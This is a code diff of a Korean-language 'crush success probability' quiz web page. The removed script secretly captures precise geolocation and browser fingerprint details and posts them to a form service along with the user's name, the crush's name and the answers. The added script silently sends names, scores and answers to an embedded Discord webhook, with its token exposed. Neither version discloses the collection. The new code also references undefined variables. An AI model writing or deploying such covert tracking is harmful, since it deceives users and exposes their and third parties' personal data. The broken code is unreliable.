@@ -6,7 +6,7 @@
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <style>
     body {
-      font-family: 'Arial', sans-serif;
+      font-family: Arial, sans-serif;
       background:#fff0f5;
       padding:24px;
       text-align:center;
@@ -27,7 +27,7 @@
     .options label { display:block; margin:6px 0; cursor:pointer; }
     input[type="text"] {
       padding:8px;
-      width:calc(100% - 18px);
+      width:100%;
       border-radius:6px;
       border:1px solid #ccc;
     }
@@ -52,183 +52,95 @@
   </style>
 </head>
 <body>
-  <h1>💘 짝사랑 성공 확률 테스트 💘</h1>
 
-  <form id="loveForm">
-    <label>당신의 이름:</label>
-    <input id="yourName" type="text" required>
-    <label>짝사랑 상대 이름:</label>
-    <input id="crushName" type="text" required>
+<h1>💘 짝사랑 성공 확률 테스트 💘</h1>
 
-    <!-- 질문 10개 유지 -->
-    <div class="question" data-q="상대와 얼마나 자주 대화하나요?">
-      <label>1️⃣ 상대와 얼마나 자주 대화하나요?</label>
-      <div class="options">
-        <label><input type="radio" name="q1" value="10"> 거의 안 해요</label>
-        <label><input type="radio" name="q1" value="40"> 가끔 해요</label>
-        <label><input type="radio" name="q1" value="70"> 자주 해요</label>
-        <label><input type="radio" name="q1" value="100"> 매일 대화해요</label>
-      </div>
-    </div>
+<form id="loveForm">
+  <label>당신의 이름</label>
+  <input id="yourName" required>
 
-    <div class="question" data-q="상대가 나를 볼 때 미소를 짓나요?">
-      <label>2️⃣ 상대가 나를 볼 때 미소를 짓나요?</label>
-      <div class="options">
-        <label><input type="radio" name="q2" value="10"> 전혀 아니요</label>
-        <label><input type="radio" name="q2" value="50"> 가끔 그래요</label>
-        <label><input type="radio" name="q2" value="80"> 자주 그래요</label>
-        <label><input type="radio" name="q2" value="100"> 항상 그래요</label>
-      </div>
-    </div>
+  <label>짝사랑 상대 이름</label>
+  <input id="crushName" required>
 
-    <div class="question" data-q="내가 먼저 연락했을 때 반응은 어떤가요?">
-      <label>3️⃣ 내가 먼저 연락했을 때 반응은 어떤가요?</label>
-      <div class="options">
-        <label><input type="radio" name="q3" value="20"> 거의 무시해요</label>
-        <label><input type="radio" name="q3" value="50"> 답은 해줘요</label>
-        <label><input type="radio" name="q3" value="80"> 반갑게 받아줘요</label>
-        <label><input type="radio" name="q3" value="100"> 먼저 연락 오기도 해요</label>
-      </div>
-    </div>
+  <div id="questions"></div>
 
-    <div class="question" data-q="서로 SNS에서 서로를 팔로우하고 있나요?">
-      <label>4️⃣ 서로 SNS에서 서로를 팔로우하고 있나요?</label>
-      <div class="options">
-        <label><input type="radio" name="q4" value="20"> 둘 다 안 해요</label>
-        <label><input type="radio" name="q4" value="50"> 한 명만 해요</label>
-        <label><input type="radio" name="q4" value="80"> 서로 팔로우해요</label>
-        <label><input type="radio" name="q4" value="100"> 자주 소통해요</label>
-      </div>
-    </div>
+  <button type="submit">결과 보기</button>
+</form>
 
-    <div class="question" data-q="상대가 나에게 관심을 보이는 것 같나요?">
-      <label>5️⃣ 상대가 나에게 관심을 보이는 것 같나요?</label>
-      <div class="options">
-        <label><input type="radio" name="q5" value="10"> 전혀 아니요</label>
-        <label><input type="radio" name="q5" value="40"> 약간 그런 듯</label>
-        <label><input type="radio" name="q5" value="70"> 제법 그런 것 같아요</label>
-        <label><input type="radio" name="q5" value="100"> 확실히 관심 있어요</label>
-      </div>
-    </div>
+<div id="result"></div>
 
-    <div class="question" data-q="상대방이 답장을 어떻게 하나요?">
-      <label>6️⃣ 상대방이 답장을 어떻게 하나요?</label>
-      <div class="options">
-        <label><input type="radio" name="q6" value="20"> 단답형이에요</label>
-        <label><input type="radio" name="q6" value="50"> 그냥 평범해요</label>
-        <label><input type="radio" name="q6" value="80"> 귀엽거나 재밌게 답해요</label>
-        <label><input type="radio" name="q6" value="100"> 애교 섞인 톤이에요</label>
-      </div>
-    </div>
+<script>
+const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1452673428657278987/IRWnuZj-k98r8nef0lgV6SLWUdjktHtkY5jVeriX7ZBpgPZEJAXJv3kCd2CVg74wJNLj";
 
-    <div class="question" data-q="상대가 먼저 말을 걸거나 연락한 적이 있나요?">
-      <label>7️⃣ 상대가 먼저 말을 걸거나 연락한 적이 있나요?</label>
-      <div class="options">
-        <label><input type="radio" name="q7" value="20"> 전혀 없어요</label>
-        <label><input type="radio" name="q7" value="50"> 가끔 있었어요</label>
-        <label><input type="radio" name="q7" value="80"> 종종 먼저 연락해요</label>
-        <label><input type="radio" name="q7" value="100"> 자주 먼저 연락해요</label>
-      </div>
-    </div>
+const questionsData = [
+  ["상대와 얼마나 자주 대화하나요?", ["거의 안 해요",10], ["가끔 해요",40], ["자주 해요",70], ["매일 대화해요",100]],
+  ["상대가 나를 볼 때 미소를 짓나요?", ["전혀 아니요",10], ["가끔",50], ["자주",80], ["항상",100]],
+  ["내가 먼저 연락했을 때 반응은?", ["무시",20], ["답은 함",50], ["반가워함",80], ["먼저 연락",100]],
+  ["SNS에서 서로 팔로우?", ["안 함",20], ["한 명만",50], ["서로",80], ["자주 소통",100]],
+  ["상대가 관심 있어 보이나요?", ["전혀",10], ["조금",40], ["꽤",70], ["확실",100]],
+  ["답장 스타일은?", ["단답",20], ["평범",50], ["재밌음",80], ["애교",100]],
+  ["상대가 먼저 연락?", ["없음",20], ["가끔",50], ["자주",80], ["항상",100]],
+  ["내 일상에 관심?", ["없음",20], ["가끔",50], ["많음",80], ["완전",100]],
+  ["내 말에 잘 웃어줌?", ["안 웃음",20], ["예의상",50], ["자주",80], ["항상",100]],
+  ["도와준 적?", ["없음",20], ["한두번",50], ["여러번",80], ["자주",100]]
+];
 
-    <div class="question" data-q="내 이야기나 일상에 관심을 보이나요?">
-      <label>8️⃣ 내 이야기나 일상에 관심을 보이나요?</label>
-      <div class="options">
-        <label><input type="radio" name="q8" value="20"> 전혀요</label>
-        <label><input type="radio" name="q8" value="50"> 가끔 물어봐요</label>
-        <label><input type="radio" name="q8" value="80"> 제법 관심 있어요</label>
-        <label><input type="radio" name="q8" value="100"> 아주 잘 기억해요</label>
-      </div>
-    </div>
+const qWrap = document.getElementById("questions");
 
-    <div class="question" data-q="내가 농담하거나 말하면 웃어주나요?">
-      <label>9️⃣ 내가 농담하거나 말하면 웃어주나요?</label>
-      <div class="options">
-        <label><input type="radio" name="q9" value="20"> 거의 안 웃어요</label>
-        <label><input type="radio" name="q9" value="50"> 예의상 웃어요</label>
-        <label><input type="radio" name="q9" value="80"> 자주 웃어요</label>
-        <label><input type="radio" name="q9" value="100"> 항상 잘 웃어요</label>
-      </div>
-    </div>
+questionsData.forEach((q,i)=>{
+  const div=document.createElement("div");
+  div.className="question";
+  div.innerHTML=`<label>${i+1}. ${q[0]}</label>`+
+    q.slice(1).map(o=>`
+      <label><input type="radio" name="q${i}" value="${o[1]}"> ${o[0]}</label>
+    `).join("");
+  qWrap.appendChild(div);
+});
 
-    <div class="question" data-q="나를 도와주거나 챙겨준 적이 있나요?">
-      <label>🔟 나를 도와주거나 챙겨준 적이 있나요?</label>
-      <div class="options">
-        <label><input type="radio" name="q10" value="20"> 그런 적 없어요</label>
-        <label><input type="radio" name="q10" value="50"> 한두 번 정도</label>
-        <label><input type="radio" name="q10" value="80"> 꽤 여러 번</label>
-        <label><input type="radio" name="q10" value="100"> 자주 챙겨줘요</label>
-      </div>
-    </div>
+document.getElementById("loveForm").addEventListener("submit", async e=>{
+  e.preventDefault();
 
-    <button type="submit">결과 보기</button>
-  </form>
+  const yourName=yourNameInput.value.trim();
+  const crushName=crushNameInput.value.trim();
+  if(!yourName||!crushName)return;
 
-  <div id="result"></div>
+  let total=0;
+  const answers=[];
 
-  <script>
-    async function tryGetLocation(timeout = 7000) {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) return resolve({ ok:false, reason:'not_supported' });
+  questionsData.forEach((q,i)=>{
+    const sel=document.querySelector(`input[name=q${i}]:checked`);
+    const v=sel?Number(sel.value):0;
+    total+=v;
+    answers.push(sel?sel.parentElement.innerText:"미응답");
+  });
 
-        let finished = false;
-        const done = (data)=>{ if(!finished){ finished=true; resolve(data); } };
+  const percent=Math.round(total/questionsData.length);
+  const msg=percent<40?"🥀 가능성 낮음":percent<70?"🌸 희망 있음":percent<90?"💞 거의 확정":"🔥 커플 각";
 
-        navigator.geolocation.getCurrentPosition(
-          pos => done({ ok:true, lat:pos.coords.latitude, lon:pos.coords.longitude }),
-          err => done({ ok:false, reason:err.code===1?'permission_denied':err.code===2?'position_unavailable':err.code===3?'timeout':'error' }),
-          { enableHighAccuracy:true, timeout, maximumAge:0 }
-        );
-        setTimeout(()=>done({ ok:false, reason:'timeout' }), timeout+1000);
-      });
-    }
+  result.innerHTML=`${yourName} 💘 ${crushName}<br><b>${percent}%</b><br>${msg}`;
 
-    document.getElementById('loveForm').addEventListener('submit', async e => {
-      e.preventDefault();
+  // Discord 전송 (실패해도 UI 영향 없음)
+  fetch(DISCORD_WEBHOOK_URL,{
+    method:"POST",
+    headers:{ "Content-Type":"application/json" },
+    body:JSON.stringify({
+      username:"💘 짝사랑 테스트",
+      embeds:[{
+        title:"📊 짝사랑 결과",
+        color:16738740,
+        fields:[
+          {name:"👤 나",value:yourName,inline:true},
+          {name:"💖 상대",value:crushName,inline:true},
+          {name:"📈 확률",value:`${percent}%`,inline:false},
+          {name:"💬 결과",value:msg,inline:false},
+          {name:"📝 응답",value:answers.slice(0,6).join("\n")}
+        ],
+        footer:{text:new Date().toISOString()}
+      }]
+    })
+  }).catch(()=>{});
+});
+</script>
 
-      const yourName = document.getElementById('yourName').value.trim();
-      const crushName = document.getElementById('crushName').value.trim();
-      const resultEl = document.getElementById('result');
-      if (!yourName || !crushName) {
-        resultEl.textContent = "⚠️ 이름을 모두 입력해주세요!";
-        return;
-      }
-
-      const questions = document.querySelectorAll('.question');
-      let total = 0;
-      const answers = [];
-      questions.forEach((q, i)=>{
-        const name='q'+(i+1);
-        const input=q.querySelector('input:checked');
-        const val=input?Number(input.value):0;
-        total+=val;
-        answers.push({ question:q.dataset.q, answer:input?input.parentElement.innerText:'미응답' });
-      });
-
-      const percent=Math.round(total/questions.length);
-      const msg=percent<40?"🥀 아직은 가능성이 낮아요...":
-        percent<70?"🌸 희망이 보여요!":
-        percent<90?"💞 좋은 분위기예요!":"🔥 완벽해요! 커플 탄생 예감!";
-
-      resultEl.innerHTML=`<b>${yourName}</b>💘<b>${crushName}</b><br>성공 확률: <b style="color:#ff69b4">${percent}%</b><br>${msg}`;
-
-      const loc=await tryGetLocation();
-      const sysInfo={
-        ua:navigator.userAgent,
-        lang:navigator.language,
-        screen:`${screen.width}x${screen.height}`,
-        tz:Intl.DateTimeFormat().resolvedOptions().timeZone,
-        time:new Date().toISOString()
-      };
-
-      const payload={yourName,crushName,percent,msg,answers,location:loc,system:sysInfo};
-
-      await fetch('https://formspree.io/f/xanegwav',{
-        method:'POST',
-        headers:{'Content-Type':'application/json'},
-        body:JSON.stringify(payload)
-      });
-    });
-  </script>
 </body>
 </html>
